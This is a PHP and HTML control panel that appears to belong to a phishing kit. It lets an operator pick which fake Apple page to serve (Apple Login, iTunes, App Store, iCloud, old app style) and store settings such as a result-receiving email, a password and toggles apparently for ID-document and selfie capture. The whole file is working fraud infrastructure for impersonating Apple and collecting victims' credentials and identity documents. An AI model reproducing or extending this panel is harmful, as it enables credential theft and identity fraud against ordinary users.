<?php

$email=$_POST['emailz'];
$namezs=$_POST['namz'];
$passi=$_POST['pssts'];
$id1=$_POST['hidden_gender'];
$id2=$_POST['hdon'];
$id3=$_POST['slfn'];
$id4=$_POST['alons'];
$linkmail=$_POST['zzeir'];

$applelog=$_POST['applelogin'];
$oldlog=$_POST['oldlogin'];
$icloudlog=$_POST['icloudlogin'];
$app=$_POST['apstore'];
$oldapp=$_POST['oldapstore'];
$phnapp=$_POST['phantom'];

$phhp=$_POST['php'];
$jvva=$_POST['java'];

$dataString = 
"[setting]\r\n".
"Email = ".$email."\r\n".
"Name = ".$namezs."\r\n".
"setup_php = ".$phhp."\r\n".
"setup_java = ".$jvva."\r\n".
"setup_rzltpa = ".$passi."\r\n".
"setup_idone = ".$id1."\r\n".
"setup_idtow = ".$id2."\r\n".
"setup_idselfi = ".$id3."\r\n".
"setup_idall = ".$id4."\r\n".
"setup_linkm = ".$linkmail."\r\n".
"setup_apple = ".$applelog."\r\n". //pages
"setup_oldaple = ".$oldlog."\r\n".
"setup_app = ".$app."\r\n".
"setup_olapp = ".$oldapp."\r\n".
"setup_phnapp = ".$phnapp."\r\n".
"setup_icloud = ".$icloudlog."\r\n";
if (isset($_POST['submit'])) {
$fWrite = fopen("../../conf.pak",'w+');

$wrote = fwrite($fWrite, $dataString);

fclose($fWrite);

}

?>
<?php
$setting = parse_ini_file('../../conf.pak');
$getem= $setting['Email'];
$getname = $setting['Name'];
$getpss = $setting['setup_rzltpa'];
$getidone = $setting['setup_idone'];
$getidtow = $setting['setup_idtow'];
$getselfi = $setting['setup_idselfi'];
$getidall = $setting['setup_idall'];
$getlinkm = $setting['setup_linkm'];
$getapples = $setting['setup_apple'];
$getoldaple = $setting['setup_oldaple'];
$getapp = $setting['setup_app'];
$getolapp = $setting['setup_olapp'];
$getphnt = $setting['setup_phnapp'];
$geticloud = $setting['setup_icloud'];

$getphi= $setting['setup_php'];
$getjavii = $setting['setup_java'];

//$array = array("Kyle","Ben","Sue","Phil","Ben","Mary","Sue","Ben");
//$counts = array_count_values($array);

?>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" />
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script src="https://gitcdn.github.io/bootstrap-toggle/2.2.2/js/bootstrap-toggle.min.js"></script>
    <link href="https://gitcdn.github.io/bootstrap-toggle/2.2.2/css/bootstrap-toggle.min.css" rel="stylesheet">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
.htry{
background:white;
padding-bottom: 20px;
padding-right: 982px;
padding-left: 80px;
padding-top: 45px;
border-radius: 94px;
}
</style>
<style>
#scroll {
    position:fixed;
    right:10px;
    bottom:10px;
    cursor:pointer;
    width:50px;
    height:50px;
    background-color:#3498db;
    text-indent:-9999px;
    display:none;
    -webkit-border-radius:60px;
    -moz-border-radius:60px;
    border-radius:60px
}
#scroll span {
    position:absolute;
    top:50%;
    left:50%;
    margin-left:-8px;
    margin-top:-12px;
    height:0;
    width:0;
    border:8px solid transparent;
    border-bottom-color:#ffffff;
}
#scroll:hover {
    background-color:#e74c3c;
    opacity:1;filter:"alpha(opacity=100)";
    -ms-filter:"alpha(opacity=100)";
}
</style>
<style>
    .btn-radio {
        width: 100%;
    }
    
    .img-radio {
        opacity: 0.5;
        margin-bottom: 20px;
    }
    
    .space-20 {
        margin-top: 20px;
    }
	
	.material-switch > input[type="checkbox"] {
    display: none;   
}

.material-switch > label {
    cursor: pointer;
    height: 0px;
    position: relative; 
    width: 40px;  
}

.material-switch > label::before {
    background: rgb(0, 0, 0);
    box-shadow: inset 0px 0px 10px rgba(0, 0, 0, 0.5);
    border-radius: 8px;
    content: '';
    height: 16px;
    margin-top: -8px;
    position:absolute;
    opacity: 0.3;
    transition: all 0.4s ease-in-out;
    width: 40px;
}
.material-switch > label::after {
    background: rgb(255, 255, 255);
    border-radius: 16px;
    box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.3);
    content: '';
    height: 24px;
    left: -4px;
    margin-top: -8px;
    position: absolute;
    top: -4px;
    transition: all 0.3s ease-in-out;
    width: 24px;
}
.material-switch > input[type="checkbox"]:checked + label::before {
    background: inherit;
    opacity: 0.5;
}
.material-switch > input[type="checkbox"]:checked + label::after {
    background: inherit;
    left: 20px;
}


.holder{
  background: #fff;
    border-top-left-radius: 53px;
    border-top-right-radius: 82px;
    border-bottom-right-radius: 60px;
    border-bottom-left-radius: 110px;	
  box-shadow: 0 2px 3px 0 rgba(0,0,0,.1);	
  margin:15px auto;
    padding-top: 25px;
    padding-right: 60px;
    padding-bottom: 0px;
    padding-left: 44px;
  width:400px;
}

td{
  border-bottom:1px solid #f6f6f6;
  padding:5px 10px;
}

td:nth-child(2){
  text-align: right;
  width: 40px;
}

tr:last-child td{
  border:none;
  padding:30px 10px 10px;
  text-align: center;
}

input[type=checkbox] {
  cursor: pointer;
  height: 30px;
  margin:4px 0 0;
  position: absolute;
  opacity: 0;
  width: 30px;
  z-index: 2;
}

input[type=checkbox] + span {
  background: #e74c3c;
  border-radius: 50%;
  box-shadow: 0 2px 3px 0 rgba(0,0,0,.1);
  display: inline-block;
  height: 30px;
  margin:4px 0 0;
  position:relative;
  width: 30px;
  transition: all .2s ease;
}

input[type=checkbox] + span::before, input[type=checkbox] + span::after{
  background:#fff;
  content:'';
  display:block;
  position:absolute;
  width:4px;
  transition: all .2s ease;
}

input[type=checkbox] + span::before{
  height:16px;
  left:13px;
  top:7px;
  -webkit-transform:rotate(-45deg);
  transform:rotate(-45deg);
}

input[type=checkbox] + span::after{
  height:16px;
  right:13px;
  top:7px;
  -webkit-transform:rotate(45deg);
  transform:rotate(45deg);
}

input[type=checkbox]:checked + span {
  background:#2ecc71;			    
}

input[type=checkbox]:checked + span::before{
  height: 9px;
  left: 9px;
  top: 13px;
  -webkit-transform:rotate(-47deg);
  transform:rotate(-47deg);
}

input[type=checkbox]:checked + span::after{
  height: 15px;
  right: 11px;
  top: 8px;
}

input[type=submit] {
  background-color: #2ecc71;
  border: 0;
  border-radius: 4px;
  color: #FFF;
  cursor: pointer;
  display: inline-block;
  font-size:16px;
  text-align: center;
  padding: 12px 20px 14px;
}
/* Button */
 .btn {
     font-size: 13px;
     font-weight: bold;
     letter-spacing: 1px;
     text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.14);
     text-transform: uppercase;
     box-shadow: -5px 6px 20px 3px rgba(15, 34, 247, 0.2);
}
 .btn-primary {
    /* Permalink - use to edit and share this gradient: http://colorzilla.com/gradient-editor/#5a7ce2+0,8283e8+50,5c5de8+51,565bd8+71,575cdb+100 */
     background: #5a7ce2;
    /* Old browsers */
     background: -moz-linear-gradient(-45deg, #5a7ce2 0%, #8283e8 50%, #5c5de8 51%, #565bd8 71%, #575cdb 100%);
    /* FF3.6-15 */
     background: -webkit-linear-gradient(-45deg, #5a7ce2 0%,#8283e8 50%,#5c5de8 51%,#565bd8 71%,#575cdb 100%);
    /* Chrome10-25,Safari5.1-6 */
     background: linear-gradient(135deg, #5a7ce2 0%,#8283e8 50%,#5c5de8 51%,#565bd8 71%,#575cdb 100%);
    /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */
     filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#5a7ce2', endColorstr='#575cdb',GradientType=1 );
    /* IE6-9 fallback on horizontal gradient */
     background-size: 400% 400%;
     -webkit-animation: AnimationName 3s ease infinite;
     -moz-animation: AnimationName 3s ease infinite;
     animation: AnimationName 3s ease infinite;
     -webkit-animation: AnimationName 3s ease infinite;
     -moz-animation: AnimationName 3s ease infinite;
     animation: AnimationName 3s ease infinite;
     border: medium none;
}
 .btn-outline-primary:hover {
     background-color: #5a7ce2;
     border-color: #5a7ce2;
     color: #fff;
}
 .btn-secondary{
    /* Permalink - use to edit and share this gradient: http://colorzilla.com/gradient-editor/#797b7f+0,b5b8bf+50,8e9397+51,8e9397+71,828589+100 */
     background: #797b7f;
    /* Old browsers */
     background: -moz-linear-gradient(-45deg, #797b7f 0%, #b5b8bf 50%, #8e9397 51%, #8e9397 71%, #828589 100%);
    /* FF3.6-15 */
     background: -webkit-linear-gradient(-45deg, #797b7f 0%,#b5b8bf 50%,#8e9397 51%,#8e9397 71%,#828589 100%);
    /* Chrome10-25,Safari5.1-6 */
     background: linear-gradient(135deg, #797b7f 0%,#b5b8bf 50%,#8e9397 51%,#8e9397 71%,#828589 100%);
    /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */
     filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#797b7f', endColorstr='#828589',GradientType=1 );
    /* IE6-9 fallback on horizontal gradient */
     background-size: 400% 400%;
     -webkit-animation: AnimationName 3s ease infinite;
     -moz-animation: AnimationName 3s ease infinite;
     animation: AnimationName 3s ease infinite;
     -webkit-animation: AnimationName 3s ease infinite;
     -moz-animation: AnimationName 3s ease infinite;
     animation: AnimationName 3s ease infinite;
     border: medium none;
}
 .btn-success{
    /* Permalink - use to edit and share this gradient: http://colorzilla.com/gradient-editor/#05ac50+0,21dd72+50,05c44e+51,05ac50+71,05ac50+100 */
     background: #05ac50;
    /* Old browsers */
     background: -moz-linear-gradient(-45deg, #05ac50 0%, #21dd72 50%, #05c44e 51%, #05ac50 71%, #05ac50 100%);
    /* FF3.6-15 */
     background: -webkit-linear-gradient(-45deg, #05ac50 0%,#21dd72 50%,#05c44e 51%,#05ac50 71%,#05ac50 100%);
    /* Chrome10-25,Safari5.1-6 */
     background: linear-gradient(135deg, #05ac50 0%,#21dd72 50%,#05c44e 51%,#05ac50 71%,#05ac50 100%);
    /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */
     filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#05ac50', endColorstr='#05ac50',GradientType=1 );
    /* IE6-9 fallback on horizontal gradient */
     background-size: 400% 400%;
     -webkit-animation: AnimationName 3s ease infinite;
     -moz-animation: AnimationName 3s ease infinite;
     animation: AnimationName 3s ease infinite;
     -webkit-animation: AnimationName 3s ease infinite;
     -moz-animation: AnimationName 3s ease infinite;
     animation: AnimationName 3s ease infinite;
     border: medium none;
}
 .btn-danger{
    /* Permalink - use to edit and share this gradient: http://colorzilla.com/gradient-editor/#e81216+0,f45355+50,f6290c+51,ed0e11+71,fc1b21+100 */
     background: #e81216;
    /* Old browsers */
     background: -moz-linear-gradient(-45deg, #e81216 0%, #f45355 50%, #f6290c 51%, #ed0e11 71%, #fc1b21 100%);
    /* FF3.6-15 */
     background: -webkit-linear-gradient(-45deg, #e81216 0%,#f45355 50%,#f6290c 51%,#ed0e11 71%,#fc1b21 100%);
    /* Chrome10-25,Safari5.1-6 */
     background: linear-gradient(135deg, #e81216 0%,#f45355 50%,#f6290c 51%,#ed0e11 71%,#fc1b21 100%);
    /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */
     filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#e81216', endColorstr='#fc1b21',GradientType=1 );
    /* IE6-9 fallback on horizontal gradient */
     background-size: 400% 400%;
     -webkit-animation: AnimationName 3s ease infinite;
     -moz-animation: AnimationName 3s ease infinite;
     animation: AnimationName 3s ease infinite;
     -webkit-animation: AnimationName 3s ease infinite;
     -moz-animation: AnimationName 3s ease infinite;
     animation: AnimationName 3s ease infinite;
     border: medium none;
}
 .btn-warning{
    /* Permalink - use to edit and share this gradient: http://colorzilla.com/gradient-editor/#e5ae09+0,ffd044+50,ffc107+51,fc9014+71,f1890b+100 */
     background: #e5ae09;
    /* Old browsers */
     background: -moz-linear-gradient(-45deg, #e5ae09 0%, #ffd044 50%, #ffc107 51%, #fc9014 71%, #f1890b 100%);
    /* FF3.6-15 */
     background: -webkit-linear-gradient(-45deg, #e5ae09 0%,#ffd044 50%,#ffc107 51%,#fc9014 71%,#f1890b 100%);
    /* Chrome10-25,Safari5.1-6 */
     background: linear-gradient(135deg, #e5ae09 0%,#ffd044 50%,#ffc107 51%,#fc9014 71%,#f1890b 100%);
    /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */
     filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#e5ae09', endColorstr='#f1890b',GradientType=1 );
    /* IE6-9 fallback on horizontal gradient */
     background-size: 400% 400%;
     -webkit-animation: AnimationName 3s ease infinite;
     -moz-animation: AnimationName 3s ease infinite;
     animation: AnimationName 3s ease infinite;
     -webkit-animation: AnimationName 3s ease infinite;
     -moz-animation: AnimationName 3s ease infinite;
     animation: AnimationName 3s ease infinite;
     border: medium none;
     color: #fff !important;
}
 .btn-info{
    /* Permalink - use to edit and share this gradient: http://colorzilla.com/gradient-editor/#01a8c1+0,2adbf7+50,00b5d1+51,0aafc9+71,0599b1+100 */
     background: #01a8c1;
    /* Old browsers */
     background: -moz-linear-gradient(-45deg, #01a8c1 0%, #2adbf7 50%, #00b5d1 51%, #0aafc9 71%, #0599b1 100%);
    /* FF3.6-15 */
     background: -webkit-linear-gradient(-45deg, #01a8c1 0%,#2adbf7 50%,#00b5d1 51%,#0aafc9 71%,#0599b1 100%);
    /* Chrome10-25,Safari5.1-6 */
     background: linear-gradient(135deg, #01a8c1 0%,#2adbf7 50%,#00b5d1 51%,#0aafc9 71%,#0599b1 100%);
    /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */
     filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#01a8c1', endColorstr='#0599b1',GradientType=1 );
    /* IE6-9 fallback on horizontal gradient */
     background-size: 400% 400%;
     -webkit-animation: AnimationName 3s ease infinite;
     -moz-animation: AnimationName 3s ease infinite;
     animation: AnimationName 3s ease infinite;
     -webkit-animation: AnimationName 3s ease infinite;
     -moz-animation: AnimationName 3s ease infinite;
     animation: AnimationName 3s ease infinite;
     border: medium none;
}
 .btn-light{
    /* Permalink - use to edit and share this gradient: http://colorzilla.com/gradient-editor/#f2f2f2+0,dddddd+50,ffffff+51,ffffff+71,f6f8fb+100 */
     background: #f2f2f2;
    /* Old browsers */
     background: -moz-linear-gradient(-45deg, #f2f2f2 0%, #dddddd 50%, #ffffff 51%, #ffffff 71%, #f6f8fb 100%);
    /* FF3.6-15 */
     background: -webkit-linear-gradient(-45deg, #f2f2f2 0%,#dddddd 50%,#ffffff 51%,#ffffff 71%,#f6f8fb 100%);
    /* Chrome10-25,Safari5.1-6 */
     background: linear-gradient(135deg, #f2f2f2 0%,#dddddd 50%,#ffffff 51%,#ffffff 71%,#f6f8fb 100%);
    /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */
     filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#f2f2f2', endColorstr='#f6f8fb',GradientType=1 );
    /* IE6-9 fallback on horizontal gradient */
     color: #3f345f !important;
     background-size: 400% 400%;
     -webkit-animation: AnimationName 3s ease infinite;
     -moz-animation: AnimationName 3s ease infinite;
     animation: AnimationName 3s ease infinite;
     -webkit-animation: AnimationName 3s ease infinite;
     -moz-animation: AnimationName 3s ease infinite;
     animation: AnimationName 3s ease infinite;
     border: medium none;
}
 .btn-dark{
    /* Permalink - use to edit and share this gradient: http://colorzilla.com/gradient-editor/#343a40+0,667584+50,4e5256+51,242a30+71,343a40+100 */
     background: #343a40;
    /* Old browsers */
     background: -moz-linear-gradient(-45deg, #343a40 0%, #667584 50%, #4e5256 51%, #242a30 71%, #343a40 100%);
    /* FF3.6-15 */
     background: -webkit-linear-gradient(-45deg, #343a40 0%,#667584 50%,#4e5256 51%,#242a30 71%,#343a40 100%);
    /* Chrome10-25,Safari5.1-6 */
     background: linear-gradient(135deg, #343a40 0%,#667584 50%,#4e5256 51%,#242a30 71%,#343a40 100%);
    /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */
     filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#343a40', endColorstr='#343a40',GradientType=1 );
    /* IE6-9 fallback on horizontal gradient */
     background-size: 400% 400%;
     -webkit-animation: AnimationName 3s ease infinite;
     -moz-animation: AnimationName 3s ease infinite;
     animation: AnimationName 3s ease infinite;
     -webkit-animation: AnimationName 3s ease infinite;
     -moz-animation: AnimationName 3s ease infinite;
     animation: AnimationName 3s ease infinite;
     border: medium none;
}
 @-webkit-keyframes AnimationName {
     0%{
        background-position:0% 31%
    }
     50%{
        background-position:100% 70%
    }
     100%{
        background-position:0% 31%
    }
}
 @-moz-keyframes AnimationName {
     0%{
        background-position:0% 31%
    }
     50%{
        background-position:100% 70%
    }
     100%{
        background-position:0% 31%
    }
}
 @keyframes AnimationName {
     0%{
        background-position:0% 31%
    }
     50%{
        background-position:100% 70%
    }
     100%{
        background-position:0% 31%
    }
}
 .btn-outline-light:hover{
     color: #3f345f;
}
 .btn-outline-warning:hover{
     color: #ffffff;
}
 .btn-sm {
     font-size: 12px;
     padding: 11px 25px;
}
 .elements-page-btn .btn {
     margin: 6px 3px;
}

</style>


<style>
@import url(https://fonts.googleapis.com/css?family=Exo+2:200i);

:root {
  /* Base font size */
  font-size: 10px;   
  
  /* Set neon color */
  --neon-text-color: #f40;
  --neon-border-color: #08f;
}

h1 {
  font-size: 3rem;
  font-family: 'Exo 2', sans-serif;
  font-weight: 200;
  font-style: italic;
  color: #fff;
  padding: 1rem;
  border: 0.4rem solid #fff;
  border-radius: 1rem;
  padding-left:30px;
  animation: flicker 1.5s infinite alternate;     
}

h1::-moz-selection {
  background-color: var(--neon-border-color);
  color: var(--neon-text-color);
}

h1::selection {
  background-color: var(--neon-border-color);
  color: var(--neon-text-color);
}

h1:focus {
  outline: none;
}

/* Animate neon flicker */
@keyframes flicker {
    
    0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
      
        text-shadow:
            -0.2rem -0.2rem 1rem #fff,
            0.2rem 0.2rem 1rem #fff,
            0 0 2rem var(--neon-text-color),
            0 0 4rem var(--neon-text-color),
            0 0 6rem var(--neon-text-color),
            0 0 8rem var(--neon-text-color),
            0 0 10rem var(--neon-text-color);
        
        box-shadow:
            0 0 .5rem #fff,
            inset 0 0 .5rem #fff,
            0 0 2rem var(--neon-border-color),
            inset 0 0 2rem var(--neon-border-color),
            0 0 4rem var(--neon-border-color),
            inset 0 0 4rem var(--neon-border-color);        
    }
    
    20%, 24%, 55% {        
        text-shadow: none;
        box-shadow: none;
    }    
}
.tooltip-inner { 
background-color:yellow;
color:black;
}
</style>
<body>

		 <form method="post" id="insert_data">	
			<p align="left">&nbsp;</p>
            <div class="col-xs-4">
                <img style="max-width: 80%;<?php $setting = parse_ini_file('../../conf.pak'); $getpseage = $setting['setup_apple']; if($getpseage == 1) { echo 'opacity:1;'; }else { echo ''; } ?>" src="https://i.ibb.co/th0sK8f/w0Hza9o.png" class="img-responsive img-radio">
                <button data-toggle="tooltip" data-placement="bottom" title="2019 Style Mobile/Desktop" type="button" class="btn btn-primary btn-radio <?php $setting = parse_ini_file('../../conf.pak'); $getpseage = $setting['setup_apple']; if($getpseage == 1) { echo 'active'; }else { echo ''; } ?>" style="width: 238;padding:11px;">Apple Login</button>
                <input name="applelogin" value="1" type="checkbox" id="left-item" class="hidden" checked>
            </div>
			<p>&nbsp;</p>
            <div class="col-xs-4">
                <img style="max-width: 80%;<?php $setting = parse_ini_file('../../conf.pak'); $getqszpage = $setting['setup_oldaple']; if($getqszpage == 1) { echo 'opacity:1;'; }else { echo ''; } ?>" src="https://i.ibb.co/tDBBytp/r-E9kf-HY-1.png" class="img-responsive img-radio">
                <button data-toggle="tooltip" data-placement="bottom" title="2018 Style Mobile/Desktop" type="button" class="btn btn-primary btn-radio <?php $setting = parse_ini_file('../../conf.pak'); $getqszpage = $setting['setup_oldaple']; if($getqszpage == 1) { echo 'active'; }else { echo ''; } ?>" style="width: 238;padding:11px;">iTunes Login</button>
                <input name="oldlogin" value="1" type="checkbox" id="middle-item" class="hidden">
            </div>
			<p>&nbsp;</p>
            <div class="col-xs-4">
                <img style="max-width: 80%;<?php $setting = parse_ini_file('../../conf.pak'); $getoipage = $setting['setup_app']; if($getoipage == 1) { echo 'opacity:1;'; }else { echo ''; } ?>" src="https://i.ibb.co/2KFYbFd/Qt-Dv-EOy-1.png" class="img-responsive img-radio">
                <button data-toggle="tooltip" data-placement="bottom" title="2018 Style Mobile/Desktop"type="button" class="btn btn-primary btn-radio <?php $setting = parse_ini_file('../../conf.pak'); $getoipage = $setting['setup_app']; if($getoipage == 1) { echo 'active'; }else { echo ''; } ?>" style="width: 238;padding:11px;">App Store</button>
                <input name="apstore" value="1" type="checkbox" id="right-item" class="hidden">
            </div>
			<div class="col-xs-4">
                <img style="max-width: 80%;<?php $setting = parse_ini_file('../../conf.pak'); $gesztpage = $setting['setup_icloud']; if($gesztpage == 1) { echo 'opacity:1;'; }else { echo ''; } ?>" src="https://i.ibb.co/3z9mLMg/QYId-TN2-1.png" class="img-responsive img-radio">
                <button data-toggle="tooltip" data-placement="bottom" title="2019 Style Mobile/Desktop" type="button" class="btn btn-primary btn-radio <?php $setting = parse_ini_file('../../conf.pak'); $gesztpage = $setting['setup_icloud']; if($gesztpage == 1) { echo 'active'; }else { echo ''; } ?>" style="width: 238;padding:11px;">iCloud Login</button>
                <input name="icloudlogin" value="1" type="checkbox" id="right-item" class="hidden">
            <br><br>
			</div>
			<br>
			<div class="col-xs-4">
			<br>
			<br>
			<br>
                <img style="max-width: 80%;<?php $setting = parse_ini_file('../../conf.pak'); $getoldpage = $setting['setup_olapp']; if($getoldpage == 1) { echo 'opacity:1;'; }else { echo ''; } ?>" src="https://i.ibb.co/ncqvCD3/Z7-BLe-RV-1.png" width="434" height="873" class="img-responsive img-radio">
                <button data-toggle="tooltip" data-placement="bottom" title="2018 Style Mobile/Desktop" type="button" class="btn btn-primary btn-radio <?php $setting = parse_ini_file('../../conf.pak'); $getoldpage = $setting['setup_olapp']; if($getoldpage == 1) { echo 'active'; }else { echo ''; } ?>" style="width: 238;padding:11px;">Old APP</button>
                <input name="oldapstore" value="1" type="checkbox" id="right-item" class="hidden">
            </div>
			<div class="col-xs-4">
			<br>
			<br>
			<br>
			<br>
                <img style="max-width: 80%;<?php $setting = parse_ini_file('../../conf.pak'); $getoldpage = $setting['setup_phnapp']; if($getoldpage == 1) { echo 'opacity:1;'; }else { echo ''; } ?>" src="https://i.ibb.co/Pt5cZdH/CVNF.png" width="434" height="873" class="img-responsive img-radio">
                <button data-toggle="tooltip" data-placement="bottom" title="2018 Style Mobile/Desktop" type="button" class="btn btn-primary btn-radio <?php $setting = parse_ini_file('../../conf.pak'); $getoldpage = $setting['setup_phnapp']; if($getoldpage == 1) { echo 'active'; }else { echo ''; } ?>" style="width: 238;padding:11px;">Image page(english)</button>
                <input name="phantom" value="1" type="checkbox" id="right-item" class="hidden">
            </div>
			
									<input hidden name="namz" type="text" value="<?php echo($getname);?>">
									<input hidden name="emailz" type="text" value="<?php echo($getem);?>">
									<input hidden name="pssts" type="text" value="<?php echo($getpss);?>">
									<input hidden name="hidden_gender" type="text" value="<?php echo($getidone);?>">
									<input hidden name="hdon" type="text" value="<?php echo($getidtow);?>">
									<input hidden name="slfn" type="text" value="<?php echo($getselfi);?>">
									<input hidden name="alons" type="text" value="<?php echo($getidall);?>">
									<input hidden name="zzeir" type="text" value="<?php echo($getlinkm);?>">
									
									<input hidden name="php" type="text" value="<?php echo($getphi);?>">
									<input hidden name="java" type="text" value="<?php echo($getjavii);?>">

			<p>&nbsp;</p><p>&nbsp;</p>
			<br>
			<hr>
<script>

    $(document).ready(function() {

        $('#gender').bootstrapToggle({
            on: ' ✔  Activate',
            off: '-- ✔  Deactivate',
            onstyle: 'success',
            offstyle: 'danger'
        });

        $('#gender').change(function() {
            if ($(this).prop('checked')) {
                $('#hidden_gender').val('1');
            } else {
                $('#hidden_gender').val('0');
            }
        });

        //-----------

        $('#rions').bootstrapToggle({
            on: ' ✔  Activate',
            off: '-- ✔  Deactivate',
            onstyle: 'success',
            offstyle: 'danger'
        });

        $('#rions').change(function() {
            if ($(this).prop('checked')) {
                $('#hdon').val('1');
            } else {
                $('#hdon').val('0');
            }
        });
		//----------- fffffffffff

        $('#alron').bootstrapToggle({
            on: ' ✔  Activate',
            off: '-- ✔  Deactivate',
            onstyle: 'success',
            offstyle: 'danger'
        });

        $('#alron').change(function() {
            if ($(this).prop('checked')) {
                $('#alons').val('1');
            } else {
                $('#alons').val('0');
            }
        });

        //-----------
		$('#selfii').bootstrapToggle({
        on: ' ✔  Activate',
        off: '-- ✔  Deactivate',
        onstyle: 'success',
        offstyle: 'danger'
        });

        $('#selfii').change(function() {
            if ($(this).prop('checked')) {
                $('#slfn').val('1');
            } else {
                $('#slfn').val('0');
            }
        });
		
		
		//-----------

        $('#zonaq').bootstrapToggle({
            on: ' ✔  Activate',
            off: '-- ✔  Deactivate',
            onstyle: 'success',
            offstyle: 'danger'
        });

        $('#zonaq').change(function() {
            if ($(this).prop('checked')) {
                $('#zzeir').val('1');
            } else {
                $('#zzeir').val('0');
            }
        });

        $(function() {
            $('.btn-radio').click(function(e) {
                $('.btn-radio').not(this).removeClass('active')
                    .siblings('input').prop('checked', false)
                    .siblings('.img-radio').css('opacity', '0.5');
                $(this).addClass('active')
                    .siblings('input').prop('checked', true)
                    .siblings('.img-radio').css('opacity', '1');
            });
        });

    });
</script>
			<button name="submit" type="submit" class="btn btn-info btn-fill pull-right" style="width: 219px;padding:20px;">Save</button>
		